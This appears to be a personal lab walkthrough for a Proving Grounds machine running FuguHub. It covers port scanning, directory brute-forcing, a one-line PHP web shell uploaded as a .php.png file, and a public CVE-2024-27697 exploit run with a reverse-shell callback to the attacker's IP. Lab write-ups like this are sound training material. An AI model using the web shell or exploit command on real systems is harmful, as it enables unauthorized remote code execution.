# NMAP

```
sudo nmap -sC -sV 192.168.236.25 -oN nmap-hub
```

![[PG/Linux/attachments/Pasted image 20250711131636.png]]
- three web servers

# 80

![[PG/Linux/attachments/Pasted image 20250711131735.png]]
- nginx/1.18.0
## Ferox 

```
feroxbuster -u http://192.168.236.25 -w /usr/share/wordlists/dirb/big.txt 
```



# 9999

## Ferox - this one says ssl so -k flag

```
feroxbuster -u http://192.168.236.25:9999 -w /usr/share/wordlists/dirb/big.txt -k -o ferox9999 
```

- ferox dies immediately with and without -k


# 8082 

## Ferox 

```
feroxbuster -u http://192.168.236.25:8082 -w /usr/share/wordlists/dirb/big.txt -o ferox8082 
```

![[PG/Linux/attachments/Pasted image 20250711132353.png]]

I guess I can make myself an admin. `cadet:cadet`

![[PG/Linux/attachments/Pasted image 20250711132529.png]]

Password too short
![[PG/Linux/attachments/Pasted image 20250711132550.png]]

I'll do `Passw0rd!`

![[PG/Linux/attachments/Pasted image 20250711132639.png]]
- sweet

Navigate to admin panel

![[PG/Linux/attachments/Pasted image 20250711132859.png]]

Clicking around

![[PG/Linux/attachments/Pasted image 20250711133018.png]]

If I select 'Request' - I can see all my feroxbuster requests

![[PG/Linux/attachments/Pasted image 20250711133135.png]]
- BarracudaServer.com
Going to exit ferox buster.


Fair amount of attack vectors

![[PG/Linux/attachments/Pasted image 20250711133404.png]]
- html rev shell?
- upload php web shell

Here's the upload images directory

![[PG/Linux/attachments/Pasted image 20250711133455.png]]

Looks like .png files are accepted.. let's try a web shell

This is where stuff is saved

![[PG/Linux/attachments/Pasted image 20250711133619.png]]

```
http://192.168.236.25:8082/protected/admin/fs/cmsdocs/autumn.txt
```


Try webshell

```
<?php system($_GET['cmd']); ?>
```

![[PG/Linux/attachments/Pasted image 20250711133733.png]]

![[PG/Linux/attachments/Pasted image 20250711133815.png]]

Looks like that worked

![[PG/Linux/attachments/Pasted image 20250711133832.png]]

Navigate to 

```
http://192.168.236.25:8082/protected/admin/fs/cmsdocs/web-shell.php.png
```

- web server can't find it 

It's here though

![[PG/Linux/attachments/Pasted image 20250711134012.png]]

Clicked on the file 
![[PG/Linux/attachments/Pasted image 20250711134036.png]]

it didn't work

![[PG/Linux/attachments/Pasted image 20250711134130.png]]

Alright. Googling exploit for this CMS 

"FuguHub 8.4 exploit CVE-2024-27697"

![[PG/Linux/attachments/Pasted image 20250711134353.png]]
- [here's one](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697/blob/main/exploit.py)

Modify exploit code 

![[PG/Linux/attachments/Pasted image 20250711134526.png]]

The exploit is basically injecting malicious LUA code into the "Customize About Page" which I saw earlier

```
python3 exploit.py -r 192.168.236.25 -rp 8082 -l 192.168.45.152 -p 9001
```
![[PG/Linux/attachments/Pasted image 20250711135127.png]]
- got my foothold

![[PG/Linux/attachments/Pasted image 20250711135201.png]]


Spawn TTY 

![[PG/Linux/attachments/Pasted image 20250711135402.png]]
- did not work..need to respawn
# Enum for privesc

```
whoami
```
![[PG/Linux/attachments/Pasted image 20250711135531.png]]

Done lol

Why are they hiding the flag again though. Did anyone get the flag.....idc.



